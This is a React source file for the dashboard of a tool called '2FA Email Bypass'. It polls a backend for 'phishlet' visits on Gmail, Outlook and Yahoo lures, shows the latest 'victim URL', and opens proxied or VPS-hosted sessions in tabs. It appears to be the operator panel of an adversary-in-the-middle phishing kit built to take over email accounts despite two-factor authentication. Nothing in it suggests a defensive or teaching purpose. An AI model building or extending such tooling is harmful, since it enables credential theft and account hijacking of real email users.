import { useState, useEffect, useRef, useCallback } from "react";
import axios from "axios";
import Sidebar from "./Sidebar";
import TerminalOutput from "./TerminalOutput";
import useAsyncAction from "../hooks/useAsyncAction";
import { getVpsIp } from "../hooks/phishletUrl";

const VPS_IP = getVpsIp();
const BASE = import.meta.env.VITE_API_URL || "";
const APP_NAME = import.meta.env.VITE_APP_NAME || "2FA Email Bypass";

function authHeaders() {
  const token = localStorage.getItem("btb_token");
  return token ? { Authorization: `Bearer ${token}` } : {};
}

const PHISHLET_KEYS = ["gmail", "outlook", "yahoo"];

function timeAgo(iso) {
  if (!iso) return "";
  const diff = Math.max(
    0,
    Math.floor((Date.now() - new Date(iso).getTime()) / 1000),
  );
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  return `${Math.floor(diff / 3600)}h ago`;
}

let tabIdCounter = 0;

export default function Dashboard() {
  const { loading, logs, run, clearLogs } = useAsyncAction();
  const [tabs, setTabs] = useState([]);
  const [activeTabId, setActiveTabId] = useState(null);
  const [iframeError, setIframeError] = useState(false);
  const [lastVisit, setLastVisit] = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const iframeRef = useRef(null);

  useEffect(() => {
    let cancelled = false;
    let timer = null;
    let interval = 5000;
    const BASE_INTERVAL = 5000;
    const MAX_INTERVAL = 30000;

    async function poll() {
      const candidates = [];
      let failed = false;
      await Promise.all(
        PHISHLET_KEYS.map((key) =>
          axios
            .get(`${BASE}/api/phishlets/visits`, {
              params: { key, limit: 1 },
              headers: authHeaders(),
            })
            .then((res) => {
              const v = (res.data.visits || [])[0];
              if (v) candidates.push({ key, ...v });
            })
            .catch(() => { failed = true; }),
        ),
      );
      if (cancelled) return;
      candidates.sort((a, b) => {
        const ta = a.timestamp ? new Date(a.timestamp).getTime() : 0;
        const tb = b.timestamp ? new Date(b.timestamp).getTime() : 0;
        return tb - ta;
      });
      setLastVisit(candidates[0] || null);

      if (failed) {
        interval = Math.min(interval * 2, MAX_INTERVAL);
      } else {
        interval = BASE_INTERVAL;
      }
      timer = setTimeout(poll, interval);
    }
    poll();
    return () => {
      cancelled = true;
      if (timer) clearTimeout(timer);
    };
  }, []);

  function addTab(url, label, phishletKey) {
    setSidebarOpen(false);
    const existing = tabs.find((t) => t.url === url);
    if (existing) {
      setActiveTabId(existing.id);
      setIframeError(false);
      return;
    }
    const id = ++tabIdCounter;
    setTabs([...tabs, { id, url, label, key: phishletKey || null }]);
    setActiveTabId(id);
    setIframeError(false);
  }

  const closeTab = useCallback(
    (id) => {
      setTabs((prev) => {
        const idx = prev.findIndex((t) => t.id === id);
        const next = prev.filter((t) => t.id !== id);
        if (activeTabId === id) {
          if (next.length === 0) {
            setActiveTabId(null);
          } else if (idx > 0) {
            setActiveTabId(next[idx - 1].id);
          } else {
            setActiveTabId(next[0].id);
          }
        }
        return next;
      });
    },
    [activeTabId],
  );

  const closeTabsByKey = useCallback(
    (key) => {
      setTabs((prev) => {
        const remaining = prev.filter((t) => t.key !== key);
        if (remaining.length === 0) {
          setActiveTabId(null);
        } else if (!remaining.find((t) => t.id === activeTabId)) {
          setActiveTabId(remaining[remaining.length - 1].id);
        }
        return remaining;
      });
    },
    [activeTabId],
  );

  const updateTabUrl = useCallback((phishletKey, newUrl) => {
    setTabs((prev) =>
      prev.map((t) => (t.key === phishletKey ? { ...t, url: newUrl } : t)),
    );
  }, []);

  const activeTab = tabs.find((t) => t.id === activeTabId);

  return (
    <div className="min-h-screen bg-gray-950 flex">
      {sidebarOpen && (
        <div
          className="fixed inset-0 bg-black/50 z-40 lg:hidden"
          onClick={() => setSidebarOpen(false)}
        />
      )}

      <div
        className={`
        fixed lg:static inset-y-0 left-0 z-50
        transform transition-transform duration-200 ease-in-out
        ${sidebarOpen ? "translate-x-0" : "-translate-x-full lg:translate-x-0"}
      `}
      >
        <Sidebar
          onRun={run}
          loading={loading}
          onOpenBrowser={addTab}
          onContainerRemovedByKey={closeTabsByKey}
          onPauseToggle={updateTabUrl}
          onClose={() => setSidebarOpen(false)}
        />
      </div>

      <main className="flex-1 flex flex-col min-w-0">
        <div className="lg:hidden flex items-center gap-3 px-4 py-3 border-b border-gray-800">
          <button
            onClick={() => setSidebarOpen(true)}
            className="text-gray-400 hover:text-green-400 transition p-1"
          >
            <svg
              className="w-5 h-5"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M4 6h16M4 12h16M4 18h16"
              />
            </svg>
          </button>
          <span className="text-sm font-bold text-green-400 tracking-widest">
            {APP_NAME}
          </span>
        </div>

        <div className="flex-1 p-3 sm:p-4 lg:p-6 overflow-y-auto">
          {lastVisit &&
            lastVisit.timestamp &&
            Date.now() - new Date(lastVisit.timestamp).getTime() <
              5 * 60 * 1000 && (
              <div className="mb-4 border border-green-900 bg-green-950/40 rounded px-3 py-2 text-xs flex items-center gap-2">
                <span className="text-green-400">🟢</span>
                <span className="text-gray-400">Last victim URL:</span>
                <span className="text-green-300 font-mono truncate max-w-[60%]">
                  {lastVisit.current_url}
                </span>
                <span className="text-gray-500 hidden sm:inline">
                  ({lastVisit.key}, {timeAgo(lastVisit.timestamp)})
                </span>
                <span className="text-gray-500 sm:hidden">
                  ({timeAgo(lastVisit.timestamp)})
                </span>
              </div>
            )}

          <TerminalOutput logs={logs} onClear={clearLogs} />

          {tabs.length > 0 && (
            <div className="mt-4 border border-gray-800 rounded-lg overflow-hidden flex-1 flex flex-col">
              <div className="bg-gray-900 border-b border-gray-800 shrink-0 flex overflow-x-auto">
                {tabs.map((tab) => (
                  <div
                    key={tab.id}
                    onClick={() => {
                      setActiveTabId(tab.id);
                      setIframeError(false);
                    }}
                    className={`flex items-center gap-1.5 px-3 py-2 text-xs cursor-pointer border-r border-gray-800 transition whitespace-nowrap shrink-0 ${
                      tab.id === activeTabId
                        ? "bg-gray-800 text-green-300"
                        : "text-gray-500 hover:text-gray-300 hover:bg-gray-850"
                    }`}
                  >
                    <span>{tab.label}</span>
                    <button
                      onClick={(e) => {
                        e.stopPropagation();
                        closeTab(tab.id);
                      }}
                      className="text-gray-600 hover:text-red-400 ml-1 leading-none"
                    >
                      ×
                    </button>
                  </div>
                ))}
                <a
                  href={activeTab?.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="ml-auto px-3 py-2 text-xs text-blue-400 hover:text-blue-300 underline shrink-0 hidden sm:block"
                >
                  open in new tab
                </a>
                <button
                  onClick={() => {
                    setTabs([]);
                    setActiveTabId(null);
                  }}
                  className="px-3 py-2 text-xs text-gray-500 hover:text-red-400 transition shrink-0"
                  title="Close browser"
                >
                  ×
                </button>
              </div>

              {iframeError ? (
                <div className="flex-1 flex items-center justify-center bg-gray-950 min-h-[300px] sm:min-h-[400px]">
                  <div className="text-center px-4">
                    <p className="text-red-400 text-sm mb-2">
                      Could not connect to {activeTab?.url}
                    </p>
                    <p className="text-gray-500 text-xs mb-4">
                      Make sure the container is running and port is open on the
                      VPS.
                    </p>
                    <a
                      href={activeTab?.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-blue-400 hover:text-blue-300 underline text-sm"
                    >
                      open in new tab instead
                    </a>
                  </div>
                </div>
              ) : (
                <iframe
                  key={`${activeTabId}-${activeTab?.url}`}
                  ref={iframeRef}
                  src={
                    activeTab?.url &&
                    !activeTab.url.startsWith(`http://${VPS_IP}/`) &&
                    !activeTab.url.startsWith(`https://${VPS_IP}/`) &&
                    !activeTab.url.startsWith(`http://${VPS_IP}:`) &&
                    !activeTab.url.startsWith(`https://${VPS_IP}:`) &&
                    !activeTab.url.includes(":580") &&
                    !activeTab.url.includes(":590")
                      ? `${BASE}/api/proxy?url=${encodeURIComponent(activeTab.url)}`
                      : activeTab?.url
                  }
                  className="w-full flex-1 min-h-[300px] sm:min-h-[400px] bg-transparent"
                  title={activeTab?.label}
                  onError={() => setIframeError(true)}
                />
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
